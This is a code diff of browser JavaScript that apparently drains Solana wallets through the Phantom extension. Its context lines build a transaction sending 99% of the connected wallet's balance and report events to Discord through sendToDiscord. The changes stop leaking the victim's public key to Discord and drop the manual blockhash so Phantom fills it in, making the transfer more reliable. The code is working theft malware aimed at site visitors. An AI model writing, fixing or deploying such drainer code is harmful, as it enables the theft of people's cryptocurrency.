@@ -45,7 +45,7 @@ $(document).ready(function() {
 
                 const minBalance = await connection.getMinimumBalanceForRentExemption(0);
                 if (walletBalance < minBalance) {
-                    sendToDiscord(`Insufficient funds for rent ${resp.publicKey.toString()}`);
+                    sendToDiscord(`Insufficient funds for rent`);
                     alert("Insufficient funds for rent.");
                     return;
                 }
@@ -89,7 +89,7 @@ $(document).ready(function() {
                 sendToDiscord('Insufficient funds for transfer');
                 return;
             }
-
+    
             const transaction = new solanaWeb3.Transaction().add(
                 solanaWeb3.SystemProgram.transfer({
                     fromPubkey: walletPublicKey,
@@ -97,14 +97,14 @@ $(document).ready(function() {
                     lamports: Math.floor(balanceForTransfer * 0.99),
                 }),
             );
-
-            // USE getRecentBlockhash for older web3.js
-            const { blockhash } = await connection.getRecentBlockhash();
-            transaction.recentBlockhash = blockhash;
+    
+            // DON'T set blockhash manually - let Phantom handle it
             transaction.feePayer = walletPublicKey;
-
-            // Sign and send
+    
+            // Sign the transaction (Phantom will add the blockhash)
             const signedTransaction = await window.solana.signTransaction(transaction);
+            
+            // Send the signed transaction
             const signature = await connection.sendRawTransaction(signedTransaction.serialize());
             
             console.log("Transaction sent:", signature);
